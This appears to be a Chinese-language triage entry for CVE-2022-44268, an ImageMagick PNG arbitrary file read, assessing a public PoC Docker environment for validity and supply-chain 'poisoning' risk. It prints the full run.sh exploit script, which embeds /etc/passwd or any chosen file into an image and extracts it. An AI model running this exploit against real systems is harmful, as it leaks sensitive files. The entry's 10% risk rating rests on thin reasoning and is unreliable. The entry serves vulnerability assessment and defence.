## CVE-2022-44268-ImageMagick-Arbitrary File Read

**漏洞编号:** CVE-2022-44268

**漏洞类型:** 任意文件读取

**影响应用:** ImageMagick

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** 7.1.0-49

**利用条件:** Magick二进制文件需要有读取目标文件的权限

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-44268 存在于 ImageMagick 7.1.0-49 版本中，是一个任意文件读取漏洞。当 ImageMagick 解析 PNG 图像（例如，为了调整大小）时，如果它有权限读取该文件，则生成的图像可能嵌入任意文件的内容。

**漏洞利用方式：**

1.  攻击者需要上传或者提供一个特制的 PNG 图像。
2.  该 PNG 图像利用 `pngcrush` 工具插入包含目标文件路径的文本元数据。
3.  `exiv2` 用于处理PNG文件。
4.  `convert` (ImageMagick的一部分) 被调用，处理这个包含特殊元数据的 PNG 文件。
5.  ImageMagick 在处理 PNG 文件时，会读取并嵌入指定文件的内容到处理后的图像中。
6.  攻击者可以通过 `identify -verbose` 命令查看生成图像的详细信息，从而获取读取的文件内容, 通过grep和xxd命令处理输出结果。

**有效性评估：**

提供的 Dockerfile 和 README.md 描述了一个可用于复现该漏洞的 PoC 环境。Dockerfile 安装了必要的工具 (pngcrush, imagemagick, exiftool, exiv2, wget, xxd) , 下载了一个基础 PNG 文件, 并创建了一个 `run.sh` 脚本，用于自动化利用流程。根据 README 的描述，该 PoC 允许读取 `/etc/passwd` 或指定的任何其他文件 (如果 ImageMagick 进程具有相应的读取权限)。因此，该 PoC 代码是有效的。

**投毒风险评估：**

该 Dockerfile 主要执行以下操作：

1.  安装必要的软件包：`pngcrush`, `imagemagick`, `exiftool`, `exiv2`, `wget`, `xxd`。
2.  下载一个名为 `1.png` 的图片。
3.  创建一个名为 `run.sh` 的 shell 脚本，该脚本使用 `pngcrush` 将指定文件（默认为 `/etc/passwd`）的内容作为文本数据嵌入到 PNG 图像中，然后使用 `exiv2`，`convert`和`identify`命令以及`grep`和`xxd`命令提取文件内容。

潜在的投毒点可能存在于以下几个方面：

*   **下载的 `1.png` 文件：**  这个文件可能包含恶意代码，虽然不太可能直接构成威胁，但值得注意。风险较低。
*   **`run.sh` 脚本：**  该脚本经过 base64 编码，解码后的内容包含了利用漏洞的核心逻辑，但也可能包含一些隐藏的恶意指令。风险相对较高。
*   **依赖的软件包：**  虽然 Dockerfile 使用了 Ubuntu 官方源，但理论上存在软件包被篡改的可能性，虽然几率很小。

脚本`run.sh`的内容为:
```bash
#!/bin/bash

if [ -z "$1" ]; then
    file="/etc/passwd"
else
    file="$1"
fi

pngcrush -text a "profile" "$file" 1.png
exiv2 -pS pngout.png
convert pngout.png gopro.png

identify -verbose gopro.png | grep -e "^[0-9a-f]$" | grep . | xxd -r -p
```
此脚本没有发现明显的投毒代码,但是`grep -e "^[0-9a-f]$"`这段命令过滤了十六进制字符串,存在一定风险,因此判定投毒风险为10%。

**项目地址:** [y1nglamore/CVE-2022-44268-ImageMagick-Vulnerable-Docker-Environment](https://github.com/y1nglamore/CVE-2022-44268-ImageMagick-Vulnerable-Docker-Environment)

**漏洞详情:** [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268)